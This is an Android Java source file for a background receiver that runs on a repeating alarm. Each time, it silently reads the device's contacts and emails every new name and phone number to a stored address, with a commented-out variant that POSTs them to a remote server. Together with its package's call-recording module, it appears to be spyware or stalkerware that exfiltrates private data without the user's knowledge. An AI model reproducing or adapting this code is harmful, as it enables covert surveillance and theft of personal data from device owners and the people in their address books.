package voluntaty.com.base;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.widget.Toast;

import com.voluntary.database.DataHelper;
import com.voluntary.record.audio.phone.SendMailTask;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Created by supergoga on 1/28/2016.
 */
public class RepeatingAlarmServiceContact extends BroadcastReceiver {

    private DataHelper dh;
    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }

    void someTask(Context context)  {
        String strt2=null;
        login=null;
        email=null;
        password=null;
        String phoneNumber = null;

        Cursor cursor = null;
        cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[] {ContactsContract.CommonDataKinds.Phone._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);

        //	startManagingCursor(cursor);

        if (cursor.getCount() > 0)
        {
            //	new RequestTask().execute(email,"insertbook","00000000");
            while (cursor.moveToNext())
            {

                String ContactTrue=null;

                dh =null;
                dh= new DataHelper(context);
                URL_HTTP=dh.selectUrl_Http();
                email=dh.selectEmail();
                login = dh.selectLogin();
                password = dh.selectPassword();

                ContactTrue=dh.selectContact(cursor.getString(2));
                int dlina=ContactTrue.length();
                if(dlina<1) {
                    // process them as you want
               //     new RequestTask().execute(email, "" + cursor.getString(1), "" + cursor.getString(2),URL_HTTP);

            List<String> toEmailList = Arrays.asList(email.split("\\s*,\\s*"));

                    String s = null;
                    String s2 = null;
                        //   s = "&Name:" + cursor.getString(1)+"&Phone:" + cursor.getString(2);

                    s = new String("&Name:" + cursor.getString(1)+"&Phone:" + cursor.getString(2));


                    byte[] utf8Bytes = new byte[0];
                    try {
                        utf8Bytes = s.getBytes("UTF8");
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }

                    try {
                        s2 = new String(utf8Bytes, "UTF8");
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }


                    //     URLEncoder.encode(s,"UTF-8");

                    new SendMailTask().execute(email,password,toEmailList, "Spisok Contact", s2);

                    s2 = null;
                    s = null;


  //   Toast.makeText(context.getApplicationContext()," 2 "+email+" NAME "+cursor.getString(1)+" PHONE "+cursor.getString(2), Toast.LENGTH_LONG).show();

                    dh.InsertContact(cursor.getString(2));
                }

                dh =null;
                URL_HTTP=null;
                //	    	Log.i("DATA"," "+email+" NAME "+cursor.getString(1)+" PHONE "+cursor.getString(2));
            //   Toast.makeText(context.getApplicationContext()," "+email+" NAME "+cursor.getString(1)+" PHONE "+cursor.getString(2), Toast.LENGTH_LONG).show();
            }
        }

        cursor = null;
        login=null;
        email=null;
        password=null;
        phoneNumber = null;

    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[3]+"/index.php/api/bookcontacts");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[0]));
                nameValuePairs.add(new BasicNameValuePair("name",params[1]));
                nameValuePairs.add(new BasicNameValuePair("phone",params[2]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }



}
